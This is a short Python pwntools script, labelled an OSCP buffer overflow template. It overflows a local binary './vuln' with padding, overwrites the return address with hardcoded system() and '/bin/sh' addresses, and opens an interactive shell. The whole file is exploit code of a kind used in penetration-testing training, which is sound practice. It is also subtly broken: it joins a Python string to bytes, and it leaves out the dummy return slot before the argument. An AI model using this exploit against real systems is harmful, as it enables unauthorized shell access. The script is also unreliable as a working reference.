#!/usr/bin/env python3
from pwn import *

# OSCP buffer overflow template
p = process('./vuln')
padding = "A" * 112
ret = p32(0x080484db)  # system()
arg1 = p32(0x0804a0f0) # "/bin/sh"
payload = padding + ret + arg1

p.sendline(payload)
p.interactive()
